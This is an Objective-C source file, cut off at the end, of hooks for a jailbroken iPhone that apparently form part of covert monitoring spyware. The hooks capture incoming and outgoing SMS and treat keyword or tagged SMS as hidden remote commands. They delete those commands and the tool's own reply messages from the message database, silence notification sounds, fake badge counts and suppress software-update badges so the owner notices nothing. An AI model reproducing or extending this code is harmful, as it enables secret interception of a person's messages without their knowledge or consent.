//
//  SMS2.h
//  MSFSP
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MSFSP.h"
#import "MSFSPUtils.h"
#import "NSString+ScanString.h"
#import "SMSUtils.h"
#import "SMS2Utils.h"
#import "NSConcreteAttributedString.h"
#import "FMDatabase.h"
#import "SMSSender000.h"
#import "FxMessage.h"

#import "SBAlertItemsController.h"

#import "IMChatRegistry.h"
#import "IMService+IOS6.h"
#import "IMServiceImpl+IOS6.h"
#import "IMMessage.h"
#import "IMMessage+IOS6.h"

#import "FZMessage.h"
#import "SpringBoard.h"
#import "SBApplication.h"
#import "SMSApplication.h"
#import "SMSApplication+IOS6.h"
#import "CKTranscriptController.h"
#import "CKConversation.h"
#import "CKConversation+IOS6.h"
#import "CKConversationList.h"
#import "CKConversationList+IOS5.h"
#import "CKConversationList+IOS6.h"
#import "CKIMMessage.h"
#import "CKConversationListController.h"
#import "CKConversationListController+IOS6.h"
#import "CKMessagesController.h"
#import "SBApplicationIcon.h"
#import "SBApplicationIcon+IOS6.h"
#import "SBApplicationController.h"
#import "SBIconController.h"
#import "SBIconController+IOS6.h"
#import "SBIconModel.h"
#import "SBAwayBulletinListController.h"
#import "SBAwayBulletinListController+IOS6.h"

#pragma mark -
#pragma mark C functions SpringBoard hooks
#pragma mark -

void callback_sms_sqlite_fn_read(sqlite3_context*,int,sqlite3_value**) {
	DLog(@"callback_sms_sqlite_fn_read----> [CALLED]");
	return;
}

bool permanentlyRemoveMessageID(NSInteger aMessageID) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *sql = @"delete from message where ROWID = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	bool success = false;
	const char *fn_name = "read";
	if (SQLITE_OK == sqlite3_create_function([db sqliteHandle], fn_name, 1, SQLITE_INTEGER, nil,
											 callback_sms_sqlite_fn_read, nil, nil)) {
		success = [db executeUpdate:sql, [NSNumber numberWithInt:aMessageID]];
	}
	DLog(@"permanentlyRemoveMessageID, success = %d, error = %@", success, [db lastErrorMessage]);
	[db close];
	[pool release];
	return (success);
}

bool isApplicationIncompatible(NSString *aAppIdentifier) {
	bool incompatible = false;
	if ([aAppIdentifier isEqualToString:@"com.apple.MobileSMS"] ||
		[aAppIdentifier isEqualToString:@"com.bitesms"]) {
		incompatible = true;
	}
	return (incompatible);
}

#pragma mark -
#pragma mark C functions (Obsolete)
#pragma mark -

bool permanentlyRemoveGuid(NSString *aGuid) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *sql = @"delete from chat where guid = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	bool success = [db executeUpdate:sql, aGuid];
	DLog(@"permanentlyRemoveGuid, success = %d, error = %@", success, [db lastErrorMessage]);
	[db close];
	[pool release];
	return (success);
}

bool hasToDeleteGuid(NSString *aGuid) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	bool hasToDelete = false;
	NSString *sql = @"select ROWID from chat where guid = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	FMResultSet *rs1 = [db executeQuery:sql, aGuid];
	DLog(@"Get chat_id, error = %@", [db lastErrorMessage]);
	if ([rs1 next]) {
		NSInteger chatID = [rs1 intForColumnIndex:0];
		sql = @"select count(message_id) from chat_message_join where chat_id = ?";
		FMResultSet *rs2 = [db executeQuery:sql, [NSNumber numberWithInt:chatID]];
		DLog(@"chatID = %d", chatID);
		DLog(@"Count message in chat_id, error = %@", [db lastErrorMessage]);
		if ([rs2 next]) {
			NSInteger count = [rs2 intForColumnIndex:0];
			DLog(@"count = %d", count);
			if (count <= 1) {
				hasToDelete = true;
			}
		}
	}
	[db close];
	[pool release];
	return (hasToDelete);
}

#pragma mark -
#pragma mark C functions used in MobileSMS hooks
#pragma mark -

bool isSMSCommandNotification(NSNotification *aNotification) {
	bool isSMSCommand = false;
	if ([[aNotification name] isEqualToString:@"CKIMMessageReceivedNotification"]) {
		id object = [aNotification object];
		DLog (@"userInfo = %@", [aNotification userInfo]);
		DLog (@"object = %@", object);
		
		CKIMMessage *ckIMMessage = object;
		if (![ckIMMessage isFromMe] && [ckIMMessage isSMS]) {
			NSString *previewText = [ckIMMessage previewText];
			DLog (@"previewText = %@", previewText);
			
			isSMSCommand = [previewText scanWithStartTag:kSMSComandFormatTag]; // Check sms command
			if (!isSMSCommand) { // Check sms keyword
				isSMSCommand = [SMSUtils checkSMSKeywordWithMonitorNumber:previewText];
			}
		}
	}
	return (isSMSCommand);
}

#pragma mark -
#pragma mark ChatKit C functions hooks
#pragma mark -

// This method is called before account$chat$style$chatProperties$messageSent$ method
MSHook(int, _CKShouldPlaySMSSounds, CFStringRef a, CFStringRef b, bool c) {
	DLog(@"=================== Remove Sound =======================");
	DLog(@"a %@",a); // MessagesBadgeController
	DLog(@"b %s",b); // ? _madridMessageSent (could be the selector)
	DLog(@"c %d",c); // ? 80 ( could be the integer)
	DLog(@"=================== Remove Sound =======================");
	
	DLog (@"SHOULD PLAY THE SOUND ? %d", ![[SMSSender000 sharedSMSSender000] mSendingSMS]);
	if(![[SMSSender000 sharedSMSSender000] mSendingSMS]){
		DLog (@"PLAY THE SOUND !");
		return __CKShouldPlaySMSSounds(a,b,c);
	} else {
		// If remove this log it cause sound to play ????
		DLog (@"DON'T PLAY THE SOUND !");
		return false;
	}
}

#pragma mark -
#pragma mark IMChatRegistry
#pragma mark -

/* This method is called when 
	- send SMS/MMS/iMessage
	- resend SMS/MMS/iMessage
	- receive the message (SMS/MMS/iMessage)
*/

HOOK(IMChatRegistry, account$chat$style$chatProperties$messageReceived$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"================== BEGIN receive account$chat$style$chatProperties$messageReceived$ ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4);
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END receive account$chat$style$chatProperties$messageReceived$ ==================");
	

	BOOL block = NO;
	NSDictionary *chatProperties = arg4;
	NSString *guid = [chatProperties objectForKey:@"guid"];
	DLog (@"guid = %@", guid);
		
	FZMessage *fzMessage = arg5;
	
	DLog (@"================== FZMessage (0) ================");
	DLog (@"flags = %d", [fzMessage flags]);
	DLog (@"guid = %@", [fzMessage guid]);
	DLog (@"errorCode = %d", [fzMessage errorCode]);
	DLog (@"time = %@", [fzMessage time]);
	DLog (@"countryCode = %@", [fzMessage countryCode]);
	DLog (@"messageID = %d", [fzMessage messageID]);
	DLog (@"replaceID = %d", [fzMessage replaceID]);
	DLog (@"roomName = %@", [fzMessage roomName]);
	DLog (@"accountID = %@", [fzMessage accountID]);
	DLog (@"account = %@", [fzMessage account]);
	DLog (@"unformattedID = %@", [fzMessage unformattedID]);
	DLog (@"service = %@", [fzMessage service]);
	DLog (@"handle = %@", [fzMessage handle]);
	DLog (@"================== FZMessage (0) ================");
	
	// Get front most application before it get killed if it is MobileSMS (Messages) application
	SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
	SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
	
	// Make sure it's SMS
	if (![fzMessage isFromMe]							&&		// incoming
		[[fzMessage subject] length] == 0				&&		// length of subject
		[[[fzMessage body] string] length] > 0			&&		// length of body
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS service
		[fzMessage fileTransferGUIDs] == nil			) {		// no file transfer guid		
		NSDictionary *senderInfo = [fzMessage senderInfo];
		NSString *senderNumber = [senderInfo objectForKey:@"FZPersonID"];
		NSString *smsText = [[fzMessage body] string];
		
		DLog (@"================== FZMessage ================");
		DLog (@"senderInfo = %@", senderInfo);
		DLog (@"senderNumber = %@", senderNumber);
		DLog (@"smsText = %@", smsText);
		DLog (@"================== FZMessage ================");
		
		block = ([smsText scanWithStartTag:kSMSComandFormatTag]			||	// Check sms command
				 [SMSUtils checkSMSKeywordWithMonitorNumber:smsText]);		// Check sms keywords
		
		DLog (@"---------------------- block the call from incoming SMS = %d ---------------------------", block);
		
		if (!block) { // Normal sms thus capture...
			SMSUtils *smsUtils = [[SMSUtils alloc] init];
			NSArray *senderNumberArr = [[NSArray alloc] initWithObjects:senderNumber, nil];
			[smsUtils writeSMSWithRecipient:senderNumberArr
									message:smsText
							   isSMSCommand:block
								  messageID:[fzMessage messageID]
									smsType:kSMSIncomming
									smsInfo:[NSDictionary dictionaryWithObject:guid forKey:kSMSInfoGroupIDKey]];
			[senderNumberArr release];
			[smsUtils release];
		} else { // It's sms command or contains keywords
			
			if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
				[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];
				[sb quitTopApplication:nil];
			} else {
				
				// Method 1
				Class $CKConversationList = objc_getClass("CKConversationList");
				CKConversationList *conversationList = [$CKConversationList sharedConversationList];
				[conversationList reloadStaleConversations];
				CKConversation *conversation = [conversationList conversationForExistingChatWithGUID:guid];
				[conversation loadAllMessages];
				
				DLog (@"///////////////////////////////////////////////////");
				DLog (@"CKConversationList class = %@", $CKConversationList);
				DLog (@"conversationList = %@", conversationList);
				DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
				DLog (@"Conversation message count = %d", [[conversation messages] count]);
				DLog (@"Conversation messages = %@", [conversation messages]);
				DLog (@"Conversation latest message = %@", [conversation latestMessage]);
				DLog (@"///////////////////////////////////////////////////");
				
				// Make no vibrate + sound
				/*
				if ([[conversation messages] count] == 0) { // Note: this FZMessage have not been added to CKConversation
					[conversation deleteAllMessagesAndRemoveGroup];
				} else {
					permanentlyRemoveMessageID([fzMessage messageID]);
				}*/
				
				// TODO: Improve by delete individual message
				permanentlyRemoveMessageID([fzMessage messageID]);
				[conversation deleteAllMessagesAndRemoveGroup];
				
				// - Method 2
				// To count how many sms in this guid
				//BOOL deleteGuid = hasToDeleteGuid(guid);
				
				// Make no vibrate + sound
				//permanentlyRemoveMessageID([fzMessage messageID]);
				//if (deleteGuid) permanentlyRemoveGuid(guid);
				
				[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];
				
				Class $SBIconController = objc_getClass("SBIconController");
				SBIconController *sbIconController = [$SBIconController sharedInstance];
				SBIconModel *sbIconModel = [sbIconController model];
				SBApplicationIcon *sbMessagesApplicationIcon = [sbIconModel applicationIconForDisplayIdentifier:@"com.apple.MobileSMS"];
				NSInteger badge = [sbMessagesApplicationIcon badgeValue];
				DLog (@"sbIconController = %@", sbIconController);
				DLog (@"sbMessagesApplicationIcon = %@", sbMessagesApplicationIcon);
				DLog (@"badge = %d", badge);
				badge = ((badge - 1) > 0) ? badge : 0;
				[sbMessagesApplicationIcon setBadge:[NSNumber numberWithInt:badge]];
				[sbMessagesApplication noteBadgeSetLocally];
			}
			
			if ([smsText scanWithStartTag:kSMSComandFormatTag]) { // Capture sms command
				SMSUtils *smsUtils = [[SMSUtils alloc] init];
				NSArray *senderNumberArr = [[NSArray alloc] initWithObjects:senderNumber, nil];
				[smsUtils writeSMSWithRecipient:senderNumberArr
										message:smsText
								   isSMSCommand:block
									  messageID:[fzMessage messageID]
										smsType:kSMSIncomming
										smsInfo:[NSDictionary dictionaryWithObject:guid forKey:kSMSInfoGroupIDKey]];
				[senderNumberArr release];
				[smsUtils release];
			}
		}
	}
	
	if (block) {
		;
	} else {
		// -----------------------------
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageReceived$, arg1, arg2, arg3, arg4, arg5);
	}
}

/* This method is called when 
 - sending SMS/MMS/iMessage successes
 - resend SMS/MMS/iMessage successes
 */

HOOK(IMChatRegistry, account$chat$style$chatProperties$messageSent$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"================== BEGIN sent account$chat$style$chatProperties$messageSent$ parameters ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4); // nil
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END sent account$chat$style$chatProperties$messageSent$ parameters ==================");
	
	BOOL block = NO;
	
	FZMessage *fzMessage = arg5;
	DLog (@"------------------ FZMessage ----------------------");
	DLog (@"senderInfo = %@", [fzMessage senderInfo]);
	DLog (@"flags = %d", [fzMessage flags]);
	DLog (@"guid = %@", [fzMessage guid]);
	DLog (@"roomName = %@", [fzMessage roomName]);
	DLog (@"accountID = %@", [fzMessage accountID]);
	DLog (@"account = %@", [fzMessage account]);
	DLog (@"service = %@", [fzMessage service]);
	DLog (@"handle = %@", [fzMessage handle]);
	DLog (@"unformattedID = %@", [fzMessage unformattedID]);
	DLog (@"isFromMe = %d", [fzMessage isFromMe]);
	DLog (@"fileTransferGUIDs = %@", [fzMessage fileTransferGUIDs]);
	DLog (@"subject = %@", [fzMessage subject]);
	
//	DLog (@"messageID = %d", [fzMessage messageID]);
//	DLog (@"replaceID = %d", [fzMessage replaceID]);
//	DLog (@"bodyData = %@", [fzMessage bodyData]);
//	DLog (@"plainBody = %@", [fzMessage plainBody]);
//	DLog (@"account = %@", [fzMessage account]);
//	DLog (@"bodyData = %@", [fzMessage bodyData]);
//	DLog (@"body = %@", [fzMessage body]);

	DLog (@"------------------ FZMessage ----------------------");
	
	if ([fzMessage isFromMe]							&&		// Outgoing
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
		[fzMessage fileTransferGUIDs] == nil			&&		// No file transfer GUIDs
		[[fzMessage subject] length] == 0				) {		// No subject
		SMSSender000 *sender000 = [SMSSender000 sharedSMSSender000];
		FxMessage *replySMS = [sender000 copyReplySMSAndDeleteOldOneIfMatchText:[[fzMessage body] string]
																	withAddress:[fzMessage handle]];
		
		block = (replySMS != nil);
		if (block) {
			DLog (@"---------------------- block = %d -------------------", block);
			
			SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
			SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
			if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
				[sb quitTopApplication:nil];
			}
			// Delete that sms reply message
			Class $CKConversationList = objc_getClass("CKConversationList");
			CKConversationList *conversationList = [$CKConversationList sharedConversationList];
			[conversationList reloadStaleConversations];
			
			// For safe use chat guid from FxMessage
			//CKConversation *conversation = [conversationList conversationForExistingChatWithAddresses:[NSArray arrayWithObject:[fzMessage handle]]];
			
			NSString *chatGUID = [replySMS mChatGUID];
			CKConversation *conversation = [conversationList conversationForExistingChatWithGUID:chatGUID];
			[conversation loadAllMessages];
			
			DLog (@"///////////////////////////////////////////////////");
			DLog (@"CKConversationList class = %@", $CKConversationList);
			DLog (@"conversationList = %@", conversationList);
			DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
			DLog (@"Conversation message count = %d", [[conversation messages] count]);
			DLog (@"Conversation messages = %@", [conversation messages]);
			DLog (@"Conversation latest message = %@", [conversation latestMessage]);
			DLog (@"Latest message rowID = %d", [[conversation latestMessage] rowID]);
			DLog (@"///////////////////////////////////////////////////");
			/*
			if (conversation && [[conversation messages] count] <= 1) {
				// Note: sometime FZMessage have been added and sometime have not been added to CKConversation
				CKIMMessage *latestMessage = [conversation latestMessage];
				[latestMessage updateMessageCompleteQuietly];
				if (([latestMessage rowID] == [fzMessage messageID]) ||
					[[conversation messages] count] == 0){
					[conversation deleteAllMessagesAndRemoveGroup];
				} else {
					permanentlyRemoveMessageID([fzMessage messageID]);
				}
			} else {
				permanentlyRemoveMessageID([fzMessage messageID]);
			}*/
			
			// TODO: Improve by delete individual message
			permanentlyRemoveMessageID([fzMessage messageID]);
			[conversation deleteAllMessagesAndRemoveGroup];
		} 
		else {
			DLog (@"[fzMessage messageID] %d", [fzMessage messageID])
			
			Class $CKDBMessage				= objc_getClass("CKDBMessage");
			CKDBMessage *dbMessage			= [[$CKDBMessage alloc] initWithRecordID:[fzMessage messageID]];
			NSArray *recipients				= [dbMessage recipients];
			
			BOOL isRecipientContainEmail	= NO;
			
			// -- check if the recipients contains email address 
			for (NSString *eachRecipient in recipients) {
				NSRange range = [eachRecipient rangeOfString:@"@"];
				if (!(range.location == NSNotFound  && range.length == 0)){	// found '@'
					DLog (@"This is email recipient %@", eachRecipient)
					isRecipientContainEmail = YES;
				}	
			}													
						
			if (isRecipientContainEmail) {
				DLog (@"++++++++++++++++++++++++++ EMAIL MMS ++++++++++++++++++++++++++++++++")
				[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
			} else {				
				DLog (@"++++++++++++++++++++++++++ SMS ++++++++++++++++++++++++++++++++")
				[[SMSSender000 sharedSMSSender000] normalSMSDidSend:[fzMessage messageID]];
			}
//			if ([[fzMessage handle] rangeOfString:@"@"].location == NSNotFound) {				// -- Capture SMS event
//				DLog (@"++++++ SMS EVENT (recipient is 1 number)+++++")				
//				DLog (@"++++++ MMS EVENT (recipient is 1 number or 1 email) +++++")			
//				
//				[[SMSSender000 sharedSMSSender000] normalSMSDidSend:[fzMessage messageID]];
//			} else { // -- no handle															// -- Capture MMS event (recipient is an email address)
//				DLog (@"++++++ SMS EVENT (recipient is multiple number)+++++")				
//				DLog (@"++++++ MMS EVENT (recipient is multiple number or email + number) +++++")								
//				[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
//			}
			
		}
		
		[replySMS release];
	} else {
		// Capture mms event
		if ([fzMessage isFromMe]							&&		// Outgoing
			[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
			([fzMessage fileTransferGUIDs] != nil || [[fzMessage subject] length])) {	// File transfer GUIDs not nil or there is subject
			DLog (@"++++++++++++++++++++++++++ MMS ++++++++++++++++++++++++++++++++")
			[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
		}
	}
	
	if (!block) {
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageSent$, arg1, arg2, arg3, arg4, arg5);
	} else {
		DLog(@"Reply SMS is sent successfully ... ");
		[[SMSSender000 sharedSMSSender000] sendSMSFinished:[fzMessage errorCode]];
	}
}

/*
 - If SMS (normal sms) sent success there is no call to this method
 - If SMS (reply sms command) sent success there are two calls (because of we delete that sms) to this method
 */
HOOK(IMChatRegistry, account$chat$style$chatProperties$messageUpdated$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"================== BEGIN update account$chat$style$chatProperties$messageUpdated$ ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4);
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END update account$chat$style$chatProperties$messageUpdated$ ==================");
	
	BOOL block = NO;
	FZMessage *fzMessage = arg5;
	
	DLog (@"================== FZMessage (1) ================");
	DLog (@"flags = %d", [fzMessage flags]);
	DLog (@"guid = %@", [fzMessage guid]);
	DLog (@"errorCode = %d", [fzMessage errorCode]);
	DLog (@"time = %@", [fzMessage time]);
	DLog (@"countryCode = %@", [fzMessage countryCode]);
	DLog (@"messageID = %d", [fzMessage messageID]);
	DLog (@"replaceID = %d", [fzMessage replaceID]);
	DLog (@"roomName = %@", [fzMessage roomName]);
	DLog (@"accountID = %@", [fzMessage accountID]);
	DLog (@"account = %@", [fzMessage account]);
	DLog (@"unformattedID = %@", [fzMessage unformattedID]);
	DLog (@"service = %@", [fzMessage service]);
	DLog (@"handle = %@", [fzMessage handle]);
	DLog (@"================== FZMessage (1) ================");
	
	if ([fzMessage isFromMe]							&&		// Outgoing
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
		[fzMessage fileTransferGUIDs] == nil			&&		// No file transfer GUIDs
		[fzMessage errorCode]) {								// There may be error in sending sms reply
		SMSSender000 *sender000 = [SMSSender000 sharedSMSSender000];
		FxMessage *replySMS = [sender000 copyReplySMSAndDeleteOldOneIfMatchText:[[fzMessage body] string]
																	withAddress:[fzMessage handle]];
		block = (replySMS != nil);
		if (block) {
			DLog (@"---------------------- (1) block = %d -------------------", block);
			
			SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
			SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
			if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
				[sb quitTopApplication:nil];
			}
			// Delete that sms reply message
			Class $CKConversationList = objc_getClass("CKConversationList");
			CKConversationList *conversationList = [$CKConversationList sharedConversationList];
			//CKConversationList *conversationList = [[$CKConversationList alloc] init];
			[conversationList reloadStaleConversations];
			
			// Note: there is difference when address to get conversation specified as +668xxx and 08xxx
			// Always get nil when pass 08xxx
			//CKConversation *conversation = [conversationList conversationForExistingChatWithAddresses:[NSArray arrayWithObject:[fzMessage handle]]];
			
			NSString *chatGUID = [replySMS mChatGUID];
			CKConversation *conversation = [conversationList conversationForExistingChatWithGUID:chatGUID];
			[conversation loadAllMessages];
			
			DLog (@"///////////////////////////////////////////////////");
			DLog (@"CKConversationList class = %@", $CKConversationList);
			DLog (@"conversationList = %@", conversationList);
			DLog (@"conversationList conversations = %@", [conversationList conversations]);
			DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
			DLog (@"Conversation message count = %d", [[conversation messages] count]);
			DLog (@"Conversation messages = %@", [conversation messages]);
			DLog (@"Conversation latest message = %@", [conversation latestMessage]);
			DLog (@"Latest message rowID = %d", [[conversation latestMessage] rowID]);
			DLog (@"///////////////////////////////////////////////////");
			/*
			if (conversation && [[conversation messages] count] <= 1) {
				// Note: sometime FZMessage have been added and sometime have not been added to CKConversation
				CKIMMessage *latestMessage = [conversation latestMessage];
				if (([latestMessage rowID] == [fzMessage messageID]) ||
					[[conversation messages] count] == 0){
					[conversation deleteAllMessagesAndRemoveGroup];
				} else {
					permanentlyRemoveMessageID([fzMessage messageID]);
				}
			} else {
				permanentlyRemoveMessageID([fzMessage messageID]);
			}*/
			
			// TODO: Improve by delete individual message
			permanentlyRemoveMessageID([fzMessage messageID]);
			[conversation deleteAllMessagesAndRemoveGroup];
			
			//[conversationList release];
		}
		
		[replySMS release];
	}
	
	if (!block) {
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageUpdated$, arg1, arg2, arg3, arg4, arg5);
	} else {
		[[SMSSender000 sharedSMSSender000] sendSMSFinished:[fzMessage errorCode]];
	}
}

#pragma mark -
#pragma mark SMSApplication, CKTranscriptController
#pragma mark -

HOOK(SMSApplication, _receivedMessage$, void, id arg1) {
	DLog (@"======= _receivedMessage, arg1 = %@ =======", arg1);
	NSNotification *notification = arg1;
	BOOL isSMSCommand = isSMSCommandNotification(notification);
	if (isSMSCommand) {
		CKIMMessage *message = [notification object];
		[message markAsRead];
		[message updateMessageCompleteQuietly];
		
		UIApplication *application = [UIApplication sharedApplication];
		NSInteger badgeNumber = [application applicationIconBadgeNumber];
		badgeNumber--;
		if (badgeNumber < 0) {
			[application setApplicationIconBadgeNumber:0];
		} else {
			[application setApplicationIconBadgeNumber:badgeNumber];
		}
		DLog (@"badgeNumber = %d", badgeNumber);
		
		CKMessagesController *_messagesController = nil;
		object_getInstanceVariable(self, "_messagesController", (void **)&_messagesController);
		CKConversationListController *_conversationListController = [_messagesController conversationListController];
		//CKTranscriptController *_transcriptController = [_messagesController transcriptController];
		CKConversationList *_conversationList = [_conversationListController conversationList];
		CKConversation *_conversation = [_conversationList firstUnreadConversation];
		DLog (@"_messagesController = %@", _messagesController);
		DLog (@"_conversationListController = %@", _conversationListController);
		//DLog (@"_transcriptController = %@", _transcriptController);
		DLog (@"_conversationList = %@", _conversationList);
		DLog (@"_conversation = %@", _conversation);
		/*
		if ([[_conversation messages] count] <= 1) {
			DLog (@"Delete all messages and remove group");
			//[_conversation deleteAllMessagesAndRemoveGroup]; // Segmentation fault: 11
			//[_conversation _deleteAllMessagesAndRemoveGroup:YES]; // Segmentation fault: 11
			
			CKIMMessage *latestMessage = [_conversation latestMessage];
			if (([latestMessage rowID] == [message rowID]) ||
				[[_conversation messages] count] == 0) {
				[_conversation performSelector:@selector(deleteAllMessagesAndRemoveGroup) withObject:nil afterDelay:0.0];
			} else {
				[_conversation deleteMessage:message];
			}
		} else {
			DLog (@"Delete message");
			[_conversation deleteMessage:message];
		}*/
		
		// TODO: Improve by delete individual message
		[_conversation deleteMessage:message];
		[_conversation performSelector:@selector(deleteAllMessagesAndRemoveGroup) withObject:nil afterDelay:0.0];
		
		DLog (@"Remove message and post update");
		[_conversation removeMessage:message postUpdate:YES];
		
		DLog (@"Clear conversation cache");
		[_messagesController _clearConversationCache];
		
		DLog (@"Update conversation controller");
		[_conversationListController updateTitle];
		[_conversationListController updateConversationList];
		
		DLog (@"Post conversation list changes");
		[_conversationList _postConversationListChangedNotification];
	} else {
		CALL_ORIG(SMSApplication, _receivedMessage$, arg1);
	}
}

HOOK(CKTranscriptController, _messageReceived$, void, id arg1) {
	DLog (@"======= _messageReceived, arg1 = %@ =======", arg1);
	NSNotification *notification = arg1;
	BOOL isSMSCommand = isSMSCommandNotification(notification);
	if (isSMSCommand) {
		// Clear the transcript controller (chat view)
		CKIMMessage *message = [notification object];
		[message markAsRead];
		[message updateMessageCompleteQuietly];
		CKConversation *_conversation = [self conversation];
		/*
		if ([[_conversation messages] count] <= 1) {
			// Sometime message have been added to conversation, sometime not
			CKIMMessage *latestMessage = [_conversation latestMessage];
			if (([latestMessage rowID] == [message rowID]) ||
				[[_conversation messages] count] == 0) {
				[_conversation deleteAllMessagesAndRemoveGroup];
			} else {
				[_conversation deleteMessage:message];
			}
		} else {
			[_conversation deleteMessage:message];
		}*/
		
		// TODO: Improve by delete individual message
		[_conversation deleteMessage:message];
		[_conversation deleteAllMessagesAndRemoveGroup];
		
		[_conversation removeMessage:message postUpdate:YES];
		Class $CKConversationList = objc_getClass("CKConversationList");
		[[$CKConversationList sharedConversationList] _postConversationListChangedNotification];
		DLog (@"_conversation = %@", _conversation);
		DLog (@"$CKConversationList = %@", [$CKConversationList sharedConversationList]);
	} else {
		CALL_ORIG(CKTranscriptController, _messageReceived$, arg1);
	}
}

#pragma mark -
#pragma mark SBAwayBulletinListController hooks
#pragma mark -

HOOK(SBAwayBulletinListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayBulletinListController <<<<<<<<<<<<<<<<<<<<<<<");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);
	DLog(@"arg3 = %d", arg3);
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayBulletinListController <<<<<<<<<<<<<<<<<<<<<<<");
	CALL_ORIG(SBAwayBulletinListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
}

#pragma mark -
#pragma mark SBAlertItemsController hooks
#pragma mark -

HOOK(SBAlertItemsController, activateAlertItem$, void, id arg1) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertItemsController <<<<<<<<<<<<<<<<<<<<<<<");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertItemsController <<<<<<<<<<<<<<<<<<<<<<<");
	CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
}

#pragma mark -
#pragma mark SBApplicationIcon hooks
#pragma mark -

// This function call first then called account$chat$style$chatProperties$messageReceived$
HOOK(SBApplicationIcon, setBadge$, void, id arg1) {
	DLog (@"------------------------ argument ------------------------");
	DLog (@"setBadge, arg1 = %@, class = %@", arg1, [arg1 class]);
	DLog (@"applicationBundleID = %@", [self applicationBundleID]);
	DLog (@"------------------------ argument ------------------------");
	if ([[self applicationBundleID] isEqualToString:@"com.apple.MobileSMS"]) {
		if ([MSFSPUtils systemOSVersion] >= 6) {
			NSNumber *badge = arg1;
			if ([badge intValue] > 0 && [badge intValue] <= 100) {
				// Decrease sms badge back to original which was increased in
				// account$chat$style$chatProperties$messageReceived$ method
				NSInteger smsBadge = [[SMS2Utils sharedSMS2Utils] mSmsBadge];
				DLog(@"setBadge -smsBadge");
				NSInteger newBadge = [badge intValue] - smsBadge;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInt:newBadge];
				[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];
			} else {
				badge = [NSNumber numberWithInt:0];
			}
			CALL_ORIG(SBApplicationIcon, setBadge$, badge);
		} else {
			CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
		}
		
	} else {
		// SWU --> Software Update Killer
		if ([[self applicationBundleID] isEqualToString:@"com.apple.Preferences"]) {
			DLog(@"=============== Remove badge in Setting!!!!");
			NSNumber *badge = [NSNumber numberWithInt:0];
			CALL_ORIG(SBApplicationIcon,setBadge$,badge);
		} else {
			CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
		}
	}
}

HOOK(SBApplicationIcon, launch, void) {
